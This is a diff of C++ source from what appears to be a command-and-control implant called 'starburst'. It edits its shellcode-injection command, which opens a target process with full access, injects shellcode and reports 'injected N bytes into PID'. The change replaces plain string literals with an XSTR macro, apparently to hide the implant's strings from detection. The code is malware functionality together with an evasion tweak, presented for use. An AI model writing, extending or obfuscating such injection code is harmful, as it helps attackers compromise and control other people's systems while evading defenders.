@@ -23,7 +23,7 @@ auto declfn starburst::cmd_shinject(
 
     if ( !sc_data || sc_len == 0 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "no shellcode provided" ) ) );
+            XSTR( "no shellcode provided" ) );
         return;
     }
 
@@ -32,7 +32,7 @@ auto declfn starburst::cmd_shinject(
     HANDLE h_proc = inst.kernel32.OpenProcess( PROCESS_ALL_ACCESS, FALSE, pid );
     if ( !h_proc ) {
         char msg[80] = { 0 };
-        str_copy( msg, symbol<char*>( const_cast<char*>( "OpenProcess failed for PID " ) ) );
+        str_copy( msg, XSTR( "OpenProcess failed for PID " ) );
         char num[16];
         int_to_str( num, pid, 10 );
         str_concat( msg, num );
@@ -45,7 +45,7 @@ auto declfn starburst::cmd_shinject(
     if ( !h_thread ) {
         inst.kernel32.CloseHandle( h_proc );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "injection failed" ) ) );
+            XSTR( "injection failed" ) );
         return;
     }
 
@@ -53,11 +53,11 @@ auto declfn starburst::cmd_shinject(
     inst.kernel32.CloseHandle( h_proc );
 
     char msg[80] = { 0 };
-    str_copy( msg, symbol<char*>( const_cast<char*>( "injected " ) ) );
+    str_copy( msg, XSTR( "injected " ) );
     char num[16];
     int_to_str( num, sc_len, 10 );
     str_concat( msg, num );
-    str_concat( msg, symbol<char*>( const_cast<char*>( " bytes into PID " ) ) );
+    str_concat( msg, XSTR( " bytes into PID " ) );
     int_to_str( num, pid, 10 );
     str_concat( msg, num );
 
